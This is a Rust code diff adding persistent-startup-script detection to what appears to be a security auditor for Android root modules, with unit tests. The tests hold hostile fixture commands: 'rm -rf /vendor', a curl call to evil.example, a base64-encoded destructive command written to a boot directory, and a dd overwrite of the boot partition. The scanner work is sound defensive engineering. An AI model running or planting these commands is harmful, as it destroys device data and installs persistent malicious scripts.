@@ -22,6 +22,8 @@ const RULE_BINARY_EXECUTED: &str = "KSU-AUDIT-BIN-002";
 const RULE_PACKED_SHELL: &str = "KSU-AUDIT-PACK-001";
 const RULE_UNPACK_LIMIT: &str = "KSU-AUDIT-PACK-002";
 const RULE_UNAUDITABLE_DECODER: &str = "KSU-AUDIT-PACK-003";
+const RULE_PERSISTENT_SCRIPT: &str = "KSU-AUDIT-PERSIST-001";
+const RULE_UNAUDITABLE_PERSISTENT_SCRIPT: &str = "KSU-AUDIT-PERSIST-002";
 const RULE_ARCHIVE_PATH: &str = "KSU-AUDIT-ZIP-001";
 const RULE_ARCHIVE_LIMIT: &str = "KSU-AUDIT-ZIP-002";
 const MAX_INDEXED_SOURCE_SIZE: usize = 4 * 1024 * 1024;
@@ -406,6 +408,7 @@ fn scan_artifact(
             artifact.provenance.clone(),
         ));
         analyze_shell(&artifact, &text, module_id, state);
+        analyze_persistent_script_writes(&artifact, &text, module_id, config, state);
     }
 
     let mut candidates = if looks_shell {
@@ -952,24 +955,33 @@ fn producer_payload(
         .map(|token| expand_variables(token, variables))
         .collect();
     let (name, args) = normalize_command(&expanded);
+    let operands = operands_before_redirection(&args);
     match name.as_str() {
         "echo" => Some(
-            args.iter()
+            operands
+                .iter()
                 .filter(|arg| !matches!(arg.as_str(), "-n" | "-e" | "-E"))
-                .cloned()
+                .map(|arg| (*arg).clone())
                 .collect::<Vec<_>>()
                 .join(" ")
                 .into_bytes(),
         ),
         "printf" => {
-            let payload = if args.first().is_some_and(|arg| arg.contains('%')) {
-                &args[1..]
+            let payload = if operands.first().is_some_and(|arg| arg.contains('%')) {
+                &operands[1..]
             } else {
-                args.as_slice()
+                operands.as_slice()
             };
-            Some(payload.join("").into_bytes())
+            Some(
+                payload
+                    .iter()
+                    .map(|arg| arg.as_str())
+                    .collect::<Vec<_>>()
+                    .join("")
+                    .into_bytes(),
+            )
         }
-        "cat" => args
+        "cat" => operands
             .iter()
             .find_map(|path| lookup_archive_file(path, variables, module_id, archive_files)),
         _ => None,
@@ -1162,6 +1174,326 @@ fn analyze_shell(artifact: &Artifact, text: &str, module_id: Option<&str>, state
             );
         }
     }
+}
+
+fn analyze_persistent_script_writes(
+    artifact: &Artifact,
+    text: &str,
+    module_id: Option<&str>,
+    config: &AuditConfig,
+    state: &mut ScanState,
+) {
+    let mut variables = predefined_variables(module_id);
+    let mut current_dir = module_id.map_or_else(
+        || "$CWD".to_owned(),
+        |_| variables.get("MODPATH").cloned().unwrap_or_default(),
+    );
+
+    for (line_index, raw_line) in logical_lines(text).iter().enumerate() {
+        let line = line_index + 1;
+        let tokens = shell_tokens(raw_line);
+        collect_assignments(&tokens, &mut variables);
+        for commands in split_pipeline_groups(&tokens) {
+            for (command_index, command) in commands.iter().enumerate() {
+                let expanded: Vec<_> = command
+                    .iter()
+                    .map(|token| expand_variables(token, &variables))
+                    .collect();
+                let (name, args) = normalize_command(&expanded);
+                if name == "cd"
+                    && let Some(target) = args.first()
+                {
+                    current_dir = resolve_path(target, &variables, &current_dir);
+                }
+                if args.iter().any(|arg| arg == "<<") {
+                    continue;
+                }
+
+                if matches!(name.as_str(), "cp" | "mv" | "install") {
+                    let operands: Vec<_> = operands_before_redirection(&args)
+                        .into_iter()
+                        .filter(|arg| !arg.starts_with('-'))
+                        .collect();
+                    if operands.len() >= 2 {
+                        let destination = resolve_path(
+                            operands.last().expect("checked length"),
+                            &variables,
+                            &current_dir,
+                        );
+                        for source in &operands[operands.len() - 2..operands.len() - 1] {
+                            let source_path = resolve_path(source, &variables, &current_dir);
+                            if let Some(target) =
+                                persistent_destination(&destination, Some(&source_path))
+                            {
+                                let content = lookup_archive_file(
+                                    &source_path,
+                                    &variables,
+                                    module_id,
+                                    &state.archive_files,
+                                );
+                                record_persistent_script(
+                                    artifact, line, raw_line, target, content, module_id, config,
+                                    state,
+                                );
+                            }
+                        }
+                    }
+                }
+
+                if name == "tee" {
+                    let content = command_index.checked_sub(1).and_then(|previous| {
+                        producer_payload(
+                            commands[previous],
+                            &variables,
+                            module_id,
+                            &state.archive_files,
+                        )
+                    });
+                    for target in operands_before_redirection(&args)
+                        .into_iter()
+                        .filter(|arg| !arg.starts_with('-'))
+                    {
+                        let resolved = resolve_path(target, &variables, &current_dir);
+                        if let Some(target) = persistent_destination(&resolved, None) {
+                            record_persistent_script(
+                                artifact,
+                                line,
+                                raw_line,
+                                target,
+                                content.clone(),
+                                module_id,
+                                config,
+                                state,
+                            );
+                        }
+                    }
+                }
+
+                let content = recover_redirected_output(
+                    command_index,
+                    &commands,
+                    &args,
+                    &variables,
+                    module_id,
+                    &state.archive_files,
+                );
+                for window in args.windows(2) {
+                    if !matches!(window[0].as_str(), ">" | ">>") {
+                        continue;
+                    }
+                    let resolved = resolve_path(&window[1], &variables, &current_dir);
+                    if let Some(target) = persistent_destination(&resolved, None) {
+                        record_persistent_script(
+                            artifact,
+                            line,
+                            raw_line,
+                            target,
+                            content.clone(),
+                            module_id,
+                            config,
+                            state,
+                        );
+                    }
+                }
+            }
+        }
+    }
+
+    for (line, target, content, evidence) in extract_persistent_heredocs(text, module_id) {
+        record_persistent_script(
+            artifact,
+            line,
+            &evidence,
+            target,
+            Some(content),
+            module_id,
+            config,
+            state,
+        );
+    }
+}
+
+fn recover_redirected_output(
+    command_index: usize,
+    commands: &[&[String]],
+    args: &[String],
+    variables: &BTreeMap<String, String>,
+    module_id: Option<&str>,
+    archive_files: &BTreeMap<String, Vec<u8>>,
+) -> Option<Vec<u8>> {
+    if let Some(content) =
+        producer_payload(commands[command_index], variables, module_id, archive_files)
+    {
+        return Some(content);
+    }
+    let expanded: Vec<_> = commands[command_index]
+        .iter()
+        .map(|token| expand_variables(token, variables))
+        .collect();
+    let (name, _) = normalize_command(&expanded);
+    if has_decode_flag(args)
+        && (name == "base64" || has_openssl_base64_grammar(args))
+        && let Some(encoded) = decoder_input(
+            command_index,
+            commands,
+            args,
+            variables,
+            module_id,
+            archive_files,
+        )
+        && let Ok(encoded) = std::str::from_utf8(&encoded)
+    {
+        return decode_base64(encoded);
+    }
+    None
+}
+
+fn persistent_destination(destination: &str, source: Option<&str>) -> Option<String> {
+    const DIRECTORIES: &[&str] = &["/data/adb/service.d", "/data/adb/bootcompleted.d"];
+    for directory in DIRECTORIES {
+        if destination == *directory || destination == format!("{directory}/") {
+            let source = source?;
+            let basename = posix_basename(source);
+            if basename.is_empty() {
+                return None;
+            }
+            return Some(format!("{directory}/{basename}"));
+        }
+        if destination
+            .strip_prefix(directory)
+            .is_some_and(|suffix| suffix.starts_with('/') && suffix.len() > 1)
+        {
+            return Some(destination.to_owned());
+        }
+    }
+    None
+}
+
+fn is_persistent_script_target(path: &str) -> bool {
+    ["/data/adb/service.d/", "/data/adb/bootcompleted.d/"]
+        .iter()
+        .any(|directory| path.starts_with(directory) && path.len() > directory.len())
+}
+
+#[allow(clippy::too_many_arguments)]
+fn record_persistent_script(
+    artifact: &Artifact,
+    line: usize,
+    raw_line: &str,
+    target: String,
+    content: Option<Vec<u8>>,
+    module_id: Option<&str>,
+    config: &AuditConfig,
+    state: &mut ScanState,
+) {
+    let Some(content) = content else {
+        add_finding(
+            state,
+            artifact,
+            RULE_UNAUDITABLE_PERSISTENT_SCRIPT,
+            Severity::High,
+            Some(line),
+            "Persistent startup script cannot be fully audited",
+            &format!("{} => {target}", raw_line.trim()),
+        );
+        return;
+    };
+    add_finding(
+        state,
+        artifact,
+        RULE_PERSISTENT_SCRIPT,
+        Severity::Notice,
+        Some(line),
+        "Persistent startup script installed",
+        &format!("{} => {target}", raw_line.trim()),
+    );
+    let mut provenance = artifact.provenance.clone();
+    provenance.push(format!(
+        "persistent script written by {}:{line}",
+        artifact.path
+    ));
+    scan_derived_bytes(
+        Artifact {
+            path: target,
+            bytes: Vec::new(),
+            provenance,
+            depth: artifact.depth,
+        },
+        content,
+        "persistent startup script",
+        module_id,
+        config,
+        state,
+    );
+}
+
+fn extract_persistent_heredocs(
+    text: &str,
+    module_id: Option<&str>,
+) -> Vec<(usize, String, Vec<u8>, String)> {
+    let lines: Vec<_> = text.lines().collect();
+    let mut output = Vec::new();
+    let mut variables = predefined_variables(module_id);
+    let mut current_dir = module_id.map_or_else(
+        || "$CWD".to_owned(),
+        |_| variables.get("MODPATH").cloned().unwrap_or_default(),
+    );
+    let mut index = 0;
+    while index < lines.len() {
+        let header = lines[index];
+        let tokens = shell_tokens(header);
+        collect_assignments(&tokens, &mut variables);
+        let (name, args) = normalize_command(&tokens);
+        if name == "cd"
+            && let Some(target) = args.first()
+        {
+            current_dir = resolve_path(target, &variables, &current_dir);
+        }
+        let Some(delimiter_index) = args.iter().position(|arg| arg == "<<") else {
+            index += 1;
+            continue;
+        };
+        let Some(raw_delimiter) = args.get(delimiter_index + 1) else {
+            index += 1;
+            continue;
+        };
+        let strip_tabs = raw_delimiter.starts_with('-');
+        let delimiter = raw_delimiter.trim_start_matches('-');
+        let target = args.windows(2).find_map(|window| {
+            matches!(window[0].as_str(), ">" | ">>").then(|| {
+                let resolved = resolve_path(&window[1], &variables, &current_dir);
+                persistent_destination(&resolved, None)
+            })?
+        });
+        let Some(target) = target else {
+            index += 1;
+            continue;
+        };
+        let mut body = Vec::new();
+        let mut cursor = index + 1;
+        let mut terminated = false;
+        while cursor < lines.len() {
+            let candidate = if strip_tabs {
+                lines[cursor].trim_start_matches('\t')
+            } else {
+                lines[cursor]
+            };
+            if candidate == delimiter {
+                terminated = true;
+                break;
+            }
+            body.extend_from_slice(candidate.as_bytes());
+            body.push(b'\n');
+            cursor += 1;
+        }
+        if terminated {
+            output.push((index + 1, target, body, header.to_owned()));
+            index = cursor + 1;
+        } else {
+            index += 1;
+        }
+    }
+    output
 }
 
 fn collect_block_target_assignments(line: &str, variables: &mut BTreeMap<String, String>) {
@@ -1430,6 +1762,7 @@ fn line_offset(bytes: &[u8], one_based_line: usize) -> Option<usize> {
 
 fn looks_like_shell(path: &str, bytes: &[u8]) -> bool {
     path.ends_with(".sh")
+        || is_persistent_script_target(path)
         || bytes.starts_with(b"#!")
         || bytes
             .get(..4096.min(bytes.len()))
@@ -2156,6 +2489,80 @@ mod tests {
         );
         assert!(report.findings.is_empty());
         assert_eq!(report.derived_artifacts, 0);
+    }
+
+    #[test]
+    fn audits_script_copied_into_service_directory() {
+        let zip = module_zip(&[
+            ("module.prop", b"id=persistent_copy\n"),
+            (
+                "customize.sh",
+                b"#!/system/bin/sh\ncp $MODPATH/scripts/late.sh /data/adb/service.d/\n",
+            ),
+            (
+                "scripts/late.sh",
+                b"#!/system/bin/sh\nrm -rf /vendor\ncurl https://evil.example/p\n",
+            ),
+        ]);
+        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
+        assert!(rules(&report).contains(&RULE_PERSISTENT_SCRIPT));
+        assert!(report.findings.iter().any(|finding| {
+            finding.path == "/data/adb/service.d/late.sh"
+                && finding.rule_id == RULE_BROAD_DELETE
+                && !finding.provenance.is_empty()
+        }));
+        assert!(report.findings.iter().any(|finding| {
+            finding.path == "/data/adb/service.d/late.sh"
+                && finding.rule_id == RULE_NETWORK
+                && !finding.provenance.is_empty()
+        }));
+    }
+
+    #[test]
+    fn audits_base64_output_written_to_bootcompleted_directory() {
+        let report = scan_file_bytes(
+            "customize.sh",
+            b"#!/system/bin/sh\necho cm0gLXJmIC92ZW5kb3IK | base64 -d > /data/adb/bootcompleted.d/late.sh\n",
+            &AuditConfig::default(),
+        );
+        assert!(report.findings.iter().any(|finding| {
+            finding.path == "/data/adb/bootcompleted.d/late.sh"
+                && finding.rule_id == RULE_BROAD_DELETE
+                && finding
+                    .provenance
+                    .iter()
+                    .any(|layer| layer.contains("persistent startup script"))
+        }));
+    }
+
+    #[test]
+    fn audits_persistent_heredoc_body() {
+        let report = scan_file_bytes(
+            "customize.sh",
+            b"#!/system/bin/sh\ncat > /data/adb/service.d/generated <<'EOF'\ndd if=x of=/dev/block/by-name/boot\nEOF\nchmod 0755 /data/adb/service.d/generated\n",
+            &AuditConfig::default(),
+        );
+        assert!(report.findings.iter().any(|finding| {
+            finding.path == "/data/adb/service.d/generated"
+                && finding.rule_id == RULE_PARTITION_WRITE
+        }));
+        assert!(!rules(&report).contains(&RULE_UNAUDITABLE_PERSISTENT_SCRIPT));
+    }
+
+    #[test]
+    fn warns_when_persistent_script_content_is_dynamic() {
+        let report = scan_file_bytes(
+            "customize.sh",
+            b"#!/system/bin/sh\ngenerate_runtime_script > /data/adb/service.d/dynamic.sh\n",
+            &AuditConfig::default(),
+        );
+        let finding = report
+            .findings
+            .iter()
+            .find(|finding| finding.rule_id == RULE_UNAUDITABLE_PERSISTENT_SCRIPT)
+            .unwrap();
+        assert_eq!(finding.severity, Severity::High);
+        assert!(finding.evidence.contains("/data/adb/service.d/dynamic.sh"));
     }
 
     #[test]
